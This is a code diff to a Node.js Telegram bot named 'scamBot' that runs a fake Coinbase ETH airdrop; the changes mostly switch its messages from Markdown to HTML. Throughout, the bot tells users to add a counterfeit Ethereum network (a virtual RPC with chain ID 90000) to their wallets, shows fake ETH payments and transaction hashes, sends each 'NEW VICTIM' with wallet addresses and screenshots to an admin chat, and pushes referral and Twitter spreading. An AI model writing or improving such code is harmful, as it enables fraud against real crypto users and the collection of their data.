@@ -23,20 +23,20 @@ const updateUser = (id, updates) => {
 };
 const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);
 
-// === ESCAPE LINK ===
-const escapeLink = (code) => `t\\.me/coinbase\\_eth\\_airdrop\\_bot?start=ref_${code}`;
+// === ESCAPE LINK (NOW HTTPS + CLICKABLE) ===
+const escapeLink = (code) => `https://t.me/coinbase_eth_airdrop_bot?start=ref_${code}`;
 
 // === RPC GUIDE ===
 const RPC_GUIDE = `
 Add this network to Coinbase Wallet:
 
-**Network Name:** Ethereum
-**RPC URL:** https://virtual.mainnet.eu.rpc.tenderly.co/4044dd2f-00ef-4abb-95ab-68ef8a62d13d
-**Chain ID:** 90000
-**Currency:** ETH
+<b>Network Name:</b> Ethereum
+<b>RPC URL:</b> https://virtual.mainnet.eu.rpc.tenderly.co/4044dd2f-00ef-4abb-95ab-68ef8a62d13d
+<b>Chain ID:</b> 90000
+<b>Currency:</b> ETH
 `.trim();
 
-// === SEND TO ADMIN (FIXED) ===
+// === SEND TO ADMIN (HTML) ===
 const sendToAdmin = async (text, photoFileId = null, postLink = null) => {
   try {
     let caption = text;
@@ -49,12 +49,12 @@ const sendToAdmin = async (text, photoFileId = null, postLink = null) => {
       const buffer = Buffer.from(response.data);
       await adminBot.telegram.sendPhoto(ADMIN_CHAT_ID, { source: buffer }, { 
         caption, 
-        parse_mode: 'Markdown',
+        parse_mode: 'HTML',
         disable_web_page_preview: true 
       });
     } else {
       await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, caption, { 
-        parse_mode: 'Markdown',
+        parse_mode: 'HTML',
         disable_web_page_preview: true 
       });
     }
@@ -62,7 +62,7 @@ const sendToAdmin = async (text, photoFileId = null, postLink = null) => {
   } catch (err) {
     console.error('ADMIN SEND FAILED:', err.message);
     try {
-      await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, `*ADMIN SEND ERROR*\n\`\`\`${err.message}\`\`\``, { parse_mode: 'Markdown' });
+      await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, `<b>ADMIN SEND ERROR</b>\n<code>${err.message}</code>`, { parse_mode: 'HTML' });
     } catch {}
   }
 };
@@ -87,26 +87,28 @@ const menuKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback('Leaderboard', 'menu_leaderboard')]
 ]);
 
-// === REUSABLE MESSAGES ===
+// === REUSABLE MESSAGES (HTML) ===
 const generateProfile = async (id) => {
   const user = getUser(id);
-  return `*PROFILE*\n\n` +
+  return `<b>PROFILE</b>\n\n` +
     `User: @${user.username}\n` +
-    `Wallet: \`${user.wallet}\`\n` +
+    `Wallet: <code>${user.wallet}</code>\n` +
     `Earned: $${user.totalEarned}\n` +
     `Referrals: ${user.referrals.length}\n` +
-    `Link: ${escapeLink(user.referralCode)}`;
+    `Link: <a href="${escapeLink(user.referralCode)}">Join Airdrop</a>`;
 };
 
 const generateReferral = async (id) => {
   const user = getUser(id);
-  return `*REFERRAL LINK*\n\nEarn $10 per referral:\n${escapeLink(user.referralCode)}\n\nYou have ${user.referrals.length} referrals.`;
+  return `<b>REFERRAL LINK</b>\n\nEarn $10 per referral:\n` +
+    `<a href="${escapeLink(user.referralCode)}">t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}</a>\n\n` +
+    `You have ${user.referrals.length} referrals.`;
 };
 
 const generateBonus = async (id) => {
   const user = getUser(id);
   const bonus = user.referrals.length * 10;
-  return `*YOUR BONUS*\n\n` +
+  return `<b>YOUR BONUS</b>\n\n` +
     `Referrals: ${user.referrals.length}\n` +
     `Total: $${bonus}\n\n` +
     `Click to withdraw:`;
@@ -114,36 +116,36 @@ const generateBonus = async (id) => {
 
 const generateLeaderboard = async () => {
   const top = Object.values(usersDB).sort((a, b) => b.totalEarned - a.totalEarned).slice(0, 10);
-  let text = `*LEADERBOARD*\n\n`;
+  let text = `<b>LEADERBOARD</b>\n\n`;
   if (top.length === 0) text += 'No entries yet.';
   top.forEach((u, i) => text += `${i + 1}. @${u.username} — $${u.totalEarned} (${u.referrals.length} refs)\n`);
   return text;
 };
 
-// === COMMANDS (SYNC WITH MENU) ===
+// === COMMANDS (HTML) ===
 scamBot.command('profile', async (ctx) => {
   const user = getUser(ctx.from.id);
   if (!user) return ctx.reply('Use /start first.');
-  ctx.reply(await generateProfile(ctx.from.id), { parse_mode: 'Markdown' });
+  ctx.reply(await generateProfile(ctx.from.id), { parse_mode: 'HTML' });
 });
 
 scamBot.command('referral', async (ctx) => {
   const user = getUser(ctx.from.id);
   if (!user) return ctx.reply('Use /start first.');
-  ctx.reply(await generateReferral(ctx.from.id), { parse_mode: 'Markdown' });
+  ctx.reply(await generateReferral(ctx.from.id), { parse_mode: 'HTML' });
 });
 
 scamBot.command('bonus', async (ctx) => {
   const user = getUser(ctx.from.id);
   if (!user) return ctx.reply('Use /start.');
   ctx.reply(await generateBonus(ctx.from.id), {
-    parse_mode: 'Markdown',
+    parse_mode: 'HTML',
     reply_markup: { inline_keyboard: [[{ text: 'WITHDRAW BONUS', callback_data: 'withdraw_bonus' }]] }
   });
 });
 
 scamBot.command('leaderboard', async (ctx) => {
-  ctx.reply(await generateLeaderboard(), { parse_mode: 'Markdown' });
+  ctx.reply(await generateLeaderboard(), { parse_mode: 'HTML' });
 });
 
 // === /start — SMART MENU OR FLOW ===
@@ -175,18 +177,23 @@ scamBot.start(async (ctx) => {
         updateUser(referrer.telegramId, referrer);
         await sendFakeETH(referrer.wallet || '0xFAKE', 0.004);
         scamBot.telegram.sendMessage(referrer.telegramId,
-          `*+1 Referral!* $10 sent.\nTotal: $${referrer.totalEarned}\n` +
-          `Link: ${escapeLink(referrer.referralCode)}`
+          `<b>+1 Referral!</b> $10 sent.\nTotal: $${referrer.totalEarned}\n` +
+          `Link: <a href="${escapeLink(referrer.referralCode)}">Join</a>`,
+          { parse_mode: 'HTML' }
         );
       }
     }
 
-    await sendToAdmin(`*NEW VICTIM*\nUser: @${user.username}\nID: \`${user.telegramId}\`\nRef: \`${code}\``);
-    ctx.reply(`Send your *Coinbase wallet address* (text) + *screenshot* (photo).`, Markup.inlineKeyboard([[Markup.button.callback('Send Wallet + SS', 'send_wallet')]]));
+    await sendToAdmin(`<b>NEW VICTIM</b>\nUser: @${user.username}\nID: <code>${user.telegramId}</code>\nRef: <code>${code}</code>`);
+    ctx.reply(`Send your <b>Coinbase wallet address</b> (text) + <b>screenshot</b> (photo).`, 
+      { ...Markup.inlineKeyboard([[Markup.button.callback('Send Wallet + SS', 'send_wallet')]]), parse_mode: 'HTML' }
+    );
   } else if (user.claimed50) {
-    ctx.reply(`*Welcome back, @${user.username}!*\nYou claimed $50 ETH.`, menuKeyboard);
+    ctx.reply(`<b>Welcome back, @${user.username}!</b>\nYou claimed $50 ETH.`, { ...menuKeyboard, parse_mode: 'HTML' });
   } else {
-    ctx.reply(`Continue your airdrop:\nStage: ${user.stage}`, Markup.inlineKeyboard([[Markup.button.callback('Resume', 'send_wallet')]]));
+    ctx.reply(`Continue your airdrop:\nStage: ${user.stage}`, 
+      { ...Markup.inlineKeyboard([[Markup.button.callback('Resume', 'send_wallet')]]), parse_mode: 'HTML' }
+    );
   }
 });
 
@@ -197,20 +204,20 @@ scamBot.on('text', async (ctx) => {
 
   const wallet = ctx.message.text.trim();
   if (!/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
-    return ctx.reply(`Invalid wallet. Send valid 0x... address.`);
+    return ctx.reply(`Invalid wallet. Send valid 0x... address.`, { parse_mode: 'HTML' });
   }
 
   user.wallet = wallet;
   user.stage = 'rpc_guide';
   saveUser(user);
 
-  await sendToAdmin(`*WALLET INPUT*\nUser: @${user.username}\nWallet: \`${wallet}\``);
-  ctx.reply(RPC_GUIDE, Markup.inlineKeyboard([[Markup.button.callback('I Added Network', 'rpc_done')]]));
+  await sendToAdmin(`<b>WALLET INPUT</b>\nUser: @${user.username}\nWallet: <code>${wallet}</code>`);
+  ctx.reply(RPC_GUIDE, { ...Markup.inlineKeyboard([[Markup.button.callback('I Added Network', 'rpc_done')]]), parse_mode: 'HTML' });
 });
 
 scamBot.on('photo', async (ctx) => {
   const user = getUser(ctx.from.id);
-  if (!user) return ctx.reply('Use /start.');
+  if (!user) return ctx.reply('Use /start.', { parse_mode: 'HTML' });
 
   const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
 
@@ -220,10 +227,10 @@ scamBot.on('photo', async (ctx) => {
       user.wallet = wallet;
       user.stage = 'rpc_guide';
       saveUser(user);
-      await sendToAdmin(`*WALLET + SS*\nUser: @${user.username}\nWallet: \`${wallet}\``, fileId);
-      ctx.reply(RPC_GUIDE, Markup.inlineKeyboard([[Markup.button.callback('I Added Network', 'rpc_done')]]));
+      await sendToAdmin(`<b>WALLET + SS</b>\nUser: @${user.username}\nWallet: <code>${wallet}</code>`, fileId);
+      ctx.reply(RPC_GUIDE, { ...Markup.inlineKeyboard([[Markup.button.callback('I Added Network', 'rpc_done')]]), parse_mode: 'HTML' });
     } else {
-      ctx.reply(`Send wallet address in *caption*.`);
+      ctx.reply(`Send wallet address in <b>caption</b>.`, { parse_mode: 'HTML' });
     }
     return;
   }
@@ -231,10 +238,10 @@ scamBot.on('photo', async (ctx) => {
   if (user.stage === 'rpc_proof') {
     user.stage = 'twitter_tasks';
     saveUser(user);
-    await sendToAdmin(`*RPC PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\``, fileId);
+    await sendToAdmin(`<b>RPC PROOF</b>\nUser: @${user.username}\nWallet: <code>${user.wallet}</code>`, fileId);
     ctx.reply(
-      `*Twitter Task:*\n1. Follow @BjExchange53077\n2. Like pinned\n3. *Quote* it\n4. Tag 3 friends\n5. Send *post link* + screenshot`,
-      Markup.inlineKeyboard([[Markup.button.callback('Send Twitter Proof', 'send_twitter_proof')]])
+      `<b>Twitter Task:</b>\n1. Follow @BjExchange53077\n2. Like pinned\n3. <b>Quote</b> it\n4. Tag 3 friends\n5. Send <b>post link</b> + screenshot`,
+      { ...Markup.inlineKeyboard([[Markup.button.callback('Send Twitter Proof', 'send_twitter_proof')]]), parse_mode: 'HTML' }
     );
     return;
   }
@@ -245,8 +252,10 @@ scamBot.on('photo', async (ctx) => {
     user.stage = 'claim_ready';
     saveUser(user);
 
-    await sendToAdmin(`*TWITTER PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\`\nPost: ${postLink}`, fileId);
-    ctx.reply(`*Tasks verified!* Claim $50 ETH:`, Markup.inlineKeyboard([[Markup.button.callback('CLAIM $50 ETH', 'claim_eth')]]));
+    await sendToAdmin(`<b>TWITTER PROOF</b>\nUser: @${user.username}\nWallet: <code>${user.wallet}</code>\nPost: ${postLink}`, fileId);
+    ctx.reply(`<b>Tasks verified!</b> Claim $50 ETH:`, 
+      { ...Markup.inlineKeyboard([[Markup.button.callback('CLAIM $50 ETH', 'claim_eth')]]), parse_mode: 'HTML' }
+    );
     return;
   }
 });
@@ -257,7 +266,7 @@ scamBot.action('send_wallet', (ctx) => {
   if (!user) return;
   user.stage = 'wallet_input';
   saveUser(user);
-  ctx.editMessageText(`Send wallet address (text/caption) + screenshot.`);
+  ctx.editMessageText(`Send wallet address (text/caption) + screenshot.`, { parse_mode: 'HTML' });
 });
 
 scamBot.action('rpc_done', (ctx) => {
@@ -265,13 +274,15 @@ scamBot.action('rpc_done', (ctx) => {
   if (!user || user.stage !== 'rpc_guide') return;
   user.stage = 'rpc_proof';
   saveUser(user);
-  ctx.editMessageText(`Send Chain ID 90000 proof.`, Markup.inlineKeyboard([[Markup.button.callback('Send RPC Proof', 'send_rpc_proof')]]));
+  ctx.editMessageText(`Send Chain ID 90000 proof.`, 
+    { ...Markup.inlineKeyboard([[Markup.button.callback('Send RPC Proof', 'send_rpc_proof')]]), parse_mode: 'HTML' }
+  );
 });
 
 scamBot.action('send_rpc_proof', (ctx) => {
   const user = getUser(ctx.from.id);
   if (!user || user.stage !== 'rpc_proof') return;
-  ctx.editMessageText(`Send proof now.`);
+  ctx.editMessageText(`Send proof now.`, { parse_mode: 'HTML' });
 });
 
 scamBot.action('send_twitter_proof', (ctx) => {
@@ -279,7 +290,7 @@ scamBot.action('send_twitter_proof', (ctx) => {
   if (!user || user.stage !== 'twitter_tasks') return;
   user.stage = 'twitter_proof';
   saveUser(user);
-  ctx.editMessageText(`Send *screenshot + post link in caption*.`, { parse_mode: 'Markdown' });
+  ctx.editMessageText(`Send <b>screenshot + post link in caption</b>.`, { parse_mode: 'HTML' });
 });
 
 // === CLAIM ONCE ONLY ===
@@ -302,42 +313,42 @@ scamBot.action('claim_eth', async (ctx) => {
 
   const txHash = "0xFAKE" + Math.random().toString(16).substr(2, 64);
   const claimMsg = 
-    `*CLAIMED!* $50 ETH sent to:\n\`\`\`\n${user.wallet}\`\`\`\n\n` +
-    `Tx: https://dashboard.tenderly.co/tx/mainnet/${txHash}\n\n` +
-    `*Share:*\n${escapeLink(user.referralCode)}`;
+    `<b>CLAIMED!</b> $50 ETH sent to:\n<code>${user.wallet}</code>\n\n` +
+    `Tx: <a href="https://dashboard.tenderly.co/tx/mainnet/${txHash}">View on Tenderly</a>\n\n` +
+    `<b>Share:</b> <a href="${escapeLink(user.referralCode)}">Join Airdrop</a>`;
 
-  await ctx.telegram.sendMessage(ctx.from.id, claimMsg, { parse_mode: 'Markdown' });
+  await ctx.telegram.sendMessage(ctx.from.id, claimMsg, { parse_mode: 'HTML' });
   await ctx.answerCbQuery('Claimed!');
 
   await sendToAdmin(
-    `*CLAIMED $50 ETH*\nUser: @${user.username}\nWallet: \`${user.wallet}\`\nTx: \`${txHash}\``
+    `<b>CLAIMED $50 ETH</b>\nUser: @${user.username}\nWallet: <code>${user.wallet}</code>\nTx: <code>${txHash}</code>`
   );
 
-  ctx.reply(`*Welcome to your dashboard!*`, menuKeyboard);
+  ctx.reply(`<b>Welcome to your dashboard!</b>`, { ...menuKeyboard, parse_mode: 'HTML' });
 });
 
-// === MENU ACTIONS (SYNC WITH COMMANDS) ===
+// === MENU ACTIONS (HTML) ===
 scamBot.action('menu_profile', async (ctx) => {
   await ctx.answerCbQuery();
-  ctx.reply(await generateProfile(ctx.from.id), { parse_mode: 'Markdown' });
+  ctx.reply(await generateProfile(ctx.from.id), { parse_mode: 'HTML' });
 });
 
 scamBot.action('menu_referral', async (ctx) => {
   await ctx.answerCbQuery();
-  ctx.reply(await generateReferral(ctx.from.id), { parse_mode: 'Markdown' });
+  ctx.reply(await generateReferral(ctx.from.id), { parse_mode: 'HTML' });
 });
 
 scamBot.action('menu_bonus', async (ctx) => {
   await ctx.answerCbQuery();
   ctx.reply(await generateBonus(ctx.from.id), {
-    parse_mode: 'Markdown',
+    parse_mode: 'HTML',
     reply_markup: { inline_keyboard: [[{ text: 'WITHDRAW BONUS', callback_data: 'withdraw_bonus' }]] }
   });
 });
 
 scamBot.action('menu_leaderboard', async (ctx) => {
   await ctx.answerCbQuery();
-  ctx.reply(await generateLeaderboard(), { parse_mode: 'Markdown' });
+  ctx.reply(await generateLeaderboard(), { parse_mode: 'HTML' });
 });
 
 scamBot.action('withdraw_bonus', async (ctx) => {
@@ -348,10 +359,10 @@ scamBot.action('withdraw_bonus', async (ctx) => {
   await sendFakeETH(user.wallet, bonus / 250);
   await ctx.answerCbQuery(`$${bonus} sent!`);
   await ctx.editMessageText(
-    `*BONUS WITHDRAWN*\n$${bonus} sent to \`${user.wallet}\``,
-    { parse_mode: 'Markdown' }
+    `<b>BONUS WITHDRAWN</b>\n$${bonus} sent to <code>${user.wallet}</code>`,
+    { parse_mode: 'HTML' }
   );
-  await sendToAdmin(`*BONUS WITHDRAWN*\nUser: @${user.username}\nAmount: $${bonus}\nWallet: \`${user.wallet}\``);
+  await sendToAdmin(`<b>BONUS WITHDRAWN</b>\nUser: @${user.username}\nAmount: $${bonus}\nWallet: <code>${user.wallet}</code>`);
 });
 
 // === SERVER ===
